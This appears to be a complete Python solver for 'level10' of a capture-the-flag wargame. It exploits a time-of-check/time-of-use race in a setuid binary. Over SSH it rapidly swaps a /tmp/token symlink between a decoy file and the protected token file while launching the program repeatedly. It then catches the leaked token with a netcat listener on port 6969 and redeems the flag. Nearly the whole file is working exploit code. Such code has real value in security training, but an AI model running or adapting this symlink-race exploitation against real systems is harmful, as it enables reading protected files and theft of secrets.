import threading
import subprocess
import os
from solver.utils import getflag
import time

token = ""

def find_ip():
	"""
	Finds the local IP address that matches the first three octets of the IP address
	specified in the environment variable "IP".
	The function executes a shell command to get the list of local IP addresses, 
	processes the output to remove leading whitespaces, and extracts the second 
	field of each line. It then compares the first three octets of each local IP 
	address with the corresponding octets of the IP address from the environment 
	variable "IP". If a match is found, the matching IP address is returned.
	Returns:
		str: The local IP address that matches the first three octets of the IP 
			 address from the environment variable "IP", or None if no match is found.
	"""
	# sed -e: specifies the script to run
	#	's/^[ \t]*//': removes leading whitespaces:
	#		s/: substitute
	# 		^: beginning of the line
	#		[ \t]*: any number of whitespaces
	#		//: replace with nothing
	# cut -d ' ' -f 2: cuts the second field of the output
	#	-d ' ': delimiter is a space
	#	-f 2: second field
	command = "ifconfig | grep inet | sed -e 's/^[ \t]*//' | cut -d ' ' -f 2"
	output = subprocess.run(command, shell=True, capture_output=True)
	local_ips = output.stdout.decode().split("\n")
	parsed_ip = os.getenv("IP").split(".")
	for ip in local_ips:
		for i, n in enumerate(ip.split(".")):
			if n != parsed_ip[i]:
				break
			if i == 2 and n == parsed_ip[i]:
				return ip
	return None

def extract_token(output, stop_event):
	global token
	if not output:
		return
	if not (".*( )*." in output or "hello" in output):
		token = output.strip()
		stop_event.set()

def start_server(stop_event):
	global token
	server = subprocess.Popen(["nc", "-l", "-k", "6969"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	while not stop_event.is_set():
		output = server.stdout.readline().decode()
		extract_token(output, stop_event)
	server.kill()
	server.wait() # Need this line to avoid zombie processes

def localhost_solver(connection, stop_event):
	"""
	Function to solve the challenge when the local IP address is not found.
	It uploads the necessary scripts to the remote server, sets permissions,
	starts a listening server, and runs the scripts to retrieve the token.
	Args:
		connection (SSHConnection): The SSH connection to the remote server.
		stop_event (threading.Event): The event used to signal when to stop the threads.
	"""
	# Copy scripts
	connection.upload("level10/resources/program_launcher.sh", "/tmp")
	connection.upload("level10/resources/symlink_switcher.sh", "/tmp")
	# Set permissions
	connection.exec("chmod +x /tmp/program_launcher.sh")
	connection.exec("chmod +x /tmp/symlink_switcher.sh")
	# Start listening server
	connection.exec("nohup nc -l -k 6969 > /tmp/level10 2>/dev/null &")
	# Run scripts
	# print("Running scripts...", flush=True)
	connection.exec("nohup /tmp/symlink_switcher.sh >/dev/null 2>&1 &")
	connection.exec("nohup /tmp/program_launcher.sh 127.0.0.1 >/dev/null 2>&1 &")
	time.sleep(2)
	# Kill processes
	# print("Killing processes...", flush=True)
	connection.exec("pkill -f program_launcher.sh || true")
	connection.exec("pkill -f symlink_switcher.sh || true")
	# Kill listening server
	connection.exec("pkill -f 'nc -l*' || true")
	# Get token
	output = connection.exec("cat /tmp/level10")
	# print("Output:", output)
	for line in output.split("\n"):
		extract_token(line, stop_event)
	# Cleanup
	connection.exec("rm -f /tmp/level10 /tmp/program_launcher.sh /tmp/symlink_switcher.sh")
	connection.exec("rm -f /tmp/mine /tmp/token")

def switch_symlink(connection, stop_event):
	connection.exec(f"echo 'hello' > /tmp/mine")
	for i in range(100):
		connection.exec(f"ln -sf /tmp/mine /tmp/token && echo 'mine'")
		connection.exec(f"ln -sf /home/user/level10/token /tmp/token && echo 'token'")
		if stop_event.is_set():
			break

def program_launch(connection, valid_ip, stop_event):
	for i in range(100):
		connection.exec(f"/home/user/level10/level10 /tmp/token {valid_ip}")	
		if stop_event.is_set():
			break

def solve(connection):
	valid_ip = find_ip()
	stop_event = threading.Event()
	if not valid_ip:
		localhost_solver(connection, stop_event)
		return token, getflag("10", token)
	try:
		server_thread = threading.Thread(target=start_server, args=(stop_event,))
		symlink_thread = threading.Thread(target=switch_symlink, args=(connection,stop_event,))
		program_thread = threading.Thread(target=program_launch, args=(connection,valid_ip,stop_event,))
		threads = [server_thread, symlink_thread, program_thread]
		for thread in threads:
			thread.start()
		while not stop_event.is_set():
			for thread in threads:
				thread.join(timeout=0.1)
	except KeyboardInterrupt:
		print("\nReceived interrupt, shutting down...")
	except Exception as e:
		print(f"An error occurred: {e}")
	finally:
		stop_event.set()
		for thread in threads:
			if thread.is_alive():
				thread.join(timeout=2)
		connection.exec("rm -f /tmp/mine /tmp/token")  # Cleanup files
		return token, getflag("10", token)
	